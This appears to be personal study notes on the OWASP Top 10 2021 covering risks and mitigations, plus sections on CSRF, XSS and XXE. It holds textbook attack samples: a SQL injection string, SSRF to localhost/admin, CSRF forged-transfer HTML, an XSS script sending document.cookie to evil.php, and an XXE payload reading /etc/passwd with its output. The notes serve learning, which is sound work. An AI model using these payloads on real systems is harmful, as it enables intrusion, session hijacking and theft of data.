- OWASP(Open Worldwide Application Security Project)
	- Open Worldwide Application Security Project
	- Risks are ranked according to the frequency of discovered security defects, the severity of the uncovered vulnerabilities, and the magnitude of their potential impacts.
	- Insight into the most prevalent security risks. Include findings and recommendations into their own security practices, thereby minimizing the presence of known risks in their applications.

- OWASP Application Security Verification Standard (ASVS) - security requirements

- A01:2021-Broken Access Control
	- Cannot act outside of their intended permissions.
	- unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.
		- IDOR(Insecure Direct Object References)
			- https://insecure-website.com/customer_account?customer=132355
		- CORS misconfiguration allows API access from unauthorized/untrusted origins
		- Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.
			- https://example.com/app/getappInfo (Unauthenticated)
 			- https://example.com/app/admin (Unauthenticated and no admin)
		- Disable web server directory listing and ensure file metadata (e.g., .git) and backup files are not present within web roots.
		- Rate limit API and controller access to minimize the harm from automated attack tooling.
		- Model access controls should enforce record ownership rather than accepting that the user can create, read, update, or delete any record.

- A02:2021 – Cryptographic Failures
	- protection needs of data in transit and at rest.
	- EU's General Data Protection Regulation (GDPR)
	- financial data protection such as PCI Data Security Standard (PCI DSS)
		- Is any data transmitted in clear text?(HTTP, SMTP, FTP)
		- Is randomness used for cryptographic purposes that was not designed to meet cryptographic requirements? Even if the correct function is chosen, does it need to be seeded by the developer, and if not, has the developer over-written the strong seeding functionality built into it with a seed that lacks sufficient entropy/unpredictability?
			- ```python
			  random.seed(10)
			  print(random.random())
			  ```
		- Computers we all use are deterministic machines that follow instructions and are required to do so in a predictable manner. Uncertainty and unpredictability are not built in.
		- Are deprecated hash functions such as MD5 or SHA1 in use, or are non-cryptographic hash functions used when cryptographic hash functions are needed? 
		- The password database uses unsalted or simple hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password database. All the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes. Hashes generated by simple or fast hash functions may be cracked by GPUs, even if they were salted.
		- Encrypt all data in transit with secure protocols such as TLS
		- Disable caching for response that contain sensitive data.
		- Apply required security controls as per the data classification.
		- Make sure to encrypt all sensitive data at rest.

- A03:2021 – Injection 
	- User-supplied data is not validated, filtered, or sanitized by the application
		- String query = "SELECT \* FROM accounts WHERE custID='" + request.getParameter("id") + "'";
			-  http://example.com/app/accountView?id=' or '1'='1
	- Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.
	- Preventing injection requires keeping data separate from commands and queries

- A04:2021 – Insecure Design 
	- There is a difference between insecure design and insecure implementation.
	- A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks. One of the factors that contribute to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.
	- Requirements and Resource Management
		- Collect and negotiate the business requirements for an application with the business, including the protection requirements concerning confidentiality, integrity, availability, and authenticity of all data assets and the expected business logic
		- Plan and negotiate the budget covering all design, build, testing, and operation, including security activities.
	- Secure Design
		- Secure design is a culture and methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent known attack methods.
	- Secure Development Lifecycle
		- Secure software requires a secure development lifecycle, some form of secure design pattern, paved road methodology, secured component library, tooling, and threat modeling(Build -> identify threats -> defense mechanism -> validate).
	- A credential recovery workflow might include “questions and answers,” which is prohibited by NIST 800-63b, the OWASP ASVS, and the OWASP Top 10. Questions and answers cannot be trusted as evidence of identity as more than one person can know the answers, which is why they are prohibited. Such code should be removed and replaced with a more secure design.

- A05:2021 – Security Misconfiguration
	- Improper configurations or permissions
	- Unnecssay features are enabled(ports, services)
	- Not changing default passwords
	- Errors not properly handled.
	- Out of date software.
	- A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.
	- Review cloud storage permissions (e.g., S3 bucket permissions).
		- Suppose one of these applications is the admin console, and default accounts weren't changed. In that case, the attacker logs in with default passwords and takes over.
		- The application server's configuration allows detailed error messages, e.g., stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.

- A06:2021 – Vulnerable and Outdated Components
	- Not knowing versions of components
	- If the software is vulnerable, unsupported, or out of date.
	- Scan regularly for vulnerabilities
		- Remove unused dependencies, unnecessary features, components, files, and documentation.
		- Continuously monitor sources like Common Vulnerability and Exposures (CVE) and National Vulnerability Database (NVD) for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.
		- Only obtain components from official sources over secure links. Prefer signed packages.
		- Monitor for libraries and components that are unmaintained or do not create security patches for older versions.
		- There are automated tools to help attackers find unpatched or misconfigured systems. For example, the Shodan IoT search engine can help you find devices that still suffer from Heartbleed vulnerability patched in April 2014.

- A07:2021 – Identification and Authentication Failures 
	- Permits credential stuffing and bruteforce attacks.
	- Permits weak passwords.
	- Ineffective credential recovery(Knowledge based)
	- Missing or ineffective multi-factor authentication.
	- User sessions or authentication tokens (mainly single sign-on (SSO) tokens) aren't properly invalidated during logout or a period of inactivity.
		- Where possible, implement multi-factor authentication
		- Do not ship or deploy with any default credentials
		- Implement weak password checks
		- Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.
		- Limit or increasingly delay login attempts, Log failures.
		- Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session identifier should not be in the URL, be securely stored, and invalidated after logout, idle, and absolute timeouts.
	- Application session timeouts aren't set correctly. A user uses a public computer to access an application. Instead of selecting "logout," the user simply closes the browser tab and walks away. An attacker uses the same browser an hour later, and the user is still authenticated.

- A08:2021 – Software and Data Integrity Failures
	- Use digital signatures to verify the software or data is from the expected source and has not been altered.
	- Ensure libraries and dependencies, such as npm or Maven, are consuming trusted repositories.
		- Nation-states have been known to attack update mechanisms, with a recent notable attack being the SolarWinds Orion attack. The company that develops the software had secure build and update integrity processes. Still, these were able to be subverted, and for several months, the firm distributed a highly targeted malicious update to more than 18,000 organizations, of which around 100 or so were affected. This is one of the most far-reaching and most significant breaches of this nature in history.

- A09:2021 – Security Logging and Monitoring Failures 
	- Auditable events, such as logins, failed logins, and high-value transactions, are not logged.
	- Logs of applications and APIs are not monitored for suspicious activity.
		- Ensure all login, access control, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts and held for enough time 
		- Establish or adopt an incident response and recovery plan,

- A10:2021 – Server-Side Request Forgery (SSRF)
	- Sanitize and validate all client-supplied input data
	- Disable HTTP redirections
	- POST /product/stock HTTP/1.0
	  Content-Type: application/x-www-form-urlencoded
	  Content-Length: 118

	  stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
	- stockApi=http://localhost/admin
	- Compromise internal services – The attacker can abuse internal services to conduct further attacks such as Remote Code Execution (RCE) or Denial of Service (DoS).

- Other prevelant issues
	- CSRF
		- GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1
		- http://bank.com/transfer.do?acct=MARIA&amount=100000
			- `<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>`
			- `<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">`
		- POST http://bank.com/transfer.do HTTP/1.1
		  acct=BOB&amount=100
		- ```html
		  <form action="http://bank.com/transfer.do" method="POST">
		  <input type="hidden" name="acct" value="MARIA"/>
		  <input type="hidden" name="amount" value="100000"/>
		  <input type="submit" value="View my pictures"/>
		  </form>
		  ```
	- XSS
		- <SCRIPT type="text/javascript">
		  var adr = '../evil.php?cakemonster=' + escape(document.cookie);
		  </SCRIPT>
		- https://insecure-website.com/status?message=All+is+well.
		  ```
		  <p>Status: All is well.</p>
		  ```
	- XXE(XML External Entity)
		- ```
		  <?xml version="1.0" encoding="UTF-8"?>
		  <stockCheck><productId>381</productId></stockCheck>
		  ```
		- ```
		  <?xml version="1.0" encoding="UTF-8"?>
		  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		  <stockCheck><productId>&xxe;</productId></stockCheck>
		  ```
		- ```
		  Invalid product ID: root:x:0:0:root:/root:/bin/bash
		  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		  bin:x:2:2:bin:/bin:/usr/sbin/nologin
		  ...
		  ```
